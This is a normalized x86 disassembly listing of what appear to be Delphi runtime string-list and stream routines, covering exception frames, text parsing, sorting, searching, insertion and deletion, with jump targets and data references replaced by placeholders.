xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417b93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4044c4
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_40451c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b9a
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404450
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4046e4
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4046e4
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4046e4
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028fc
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028fc
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4046e4
mov ebx eax
test ebx ebx
je r-xdata
sub_417bb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417c28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c2f
lea eax [ ebp - 0xc ]
call sub_40442c
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_417c3c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_417ce8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_40493c
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_40cb44
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417cef
lea eax [ ebp - 0x14 ]
call sub_40442c
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_417cfb
inc [ ecx ]
add [ eax ] al
add [ 0x53000000 ] bh
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_417d38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417d68
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418dfc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417db0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417db7
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_417dbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417e5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417734
xor eax eax
push ebp
push sub_417e3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_418914
mov esi eax
mov eax ebx
call sub_4188e0
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_40451c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e44
mov eax [ ebp - 0x4 ]
call sub_4177f0
retn
sub_417e68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417f09
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f10
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov eax [ ebp - 0x4 ]
call sub_417734
xor eax eax
push ebp
push sub_417eec
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177f0
retn
sub_417f18
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx ebp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_417f4c
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417ff0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41a8a8
mov eax [ ebp - 0x4 ]
call sub_417734
xor eax eax
push ebp
push sub_417fcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_419af8
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41b508
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417fd2
mov eax [ ebp - 0x4 ]
call sub_4177f0
retn
sub_417ffc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418dfc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418047
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41804e
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_418054
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4180a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_418b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4180a8
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4180b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4061ac
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_4180e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41812b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40461c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418132
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_418138
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4181ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417734
xor edx edx
push ebp
push sub_4181cf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181d6
mov eax [ ebp - 0x4 ]
call sub_4177f0
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40451c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_4181fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418272
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ca0c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41ca14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418279
lea eax [ ebp - 0xc ]
call sub_40442c
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41df5c
inc esi
dec ebx
jne r-xdata
sub_41828c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417574
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404f0c
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4182f4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4178e8
jmp r-xdata
sub_418390
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404f0c
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4183d0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4178e8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404ff8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41843c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4178e8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4178e8
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_418498
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_418498
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_4184bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_418534
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4178e8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_404480
pop edi
pop esi
pop ebx
retn
sub_418570
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4178e8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_418598
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_4185cc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_417bb0
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_418618
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4178e8
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4178e8
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41866c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_418598
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_404480
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028fc
sub_4186e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4178e8
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4178e8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_404480
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_418740
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4178e8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_418780
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418498
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418780
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_418830
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41888c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_418780
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4188e0
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_418914
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_418978
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx ]
pop ebp
retn 0x8
jmp r-xdata
sub_4189cc
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403610
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
mov esp ebp
pop ebp
retn
sub_418a18
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403608
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_4189cc
pop ecx
mov eax [ ebx ]
call sub_40364c
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_4189cc
pop ecx
sub_418a9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_418b0c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x8 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
